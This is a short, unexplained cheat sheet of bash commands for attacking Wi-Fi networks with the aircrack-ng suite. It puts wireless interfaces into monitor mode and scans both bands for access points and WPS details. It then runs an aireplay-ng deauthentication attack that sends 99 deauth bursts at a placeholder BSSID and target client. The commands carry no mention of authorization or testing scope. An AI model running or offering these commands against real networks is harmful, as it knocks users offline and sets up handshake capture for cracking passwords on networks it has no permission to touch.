```bash
https://github.com/aircrack-ng/rtl8812au
```

```bash
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

ip link set wlan1 down
iw dev wlan1 set type monitor
ip link set wlan1 up
```

```bash
airmon-ng start wlan0
```

```bash
airodump-ng wlan0 --band a --manufacturer --beacons --showack --wps --uptime

airodump-ng wlan0 --band bg --manufacturer --beacons --showack --wps --uptime
```

```bash
iwconfig wlan0 channel 4

aireplay-ng -0 99 -a BSSID -c TARGET wlan0
```

```bash
kill -9 `ps aux | grep -i aircrack | awk '{print $2}'`
```
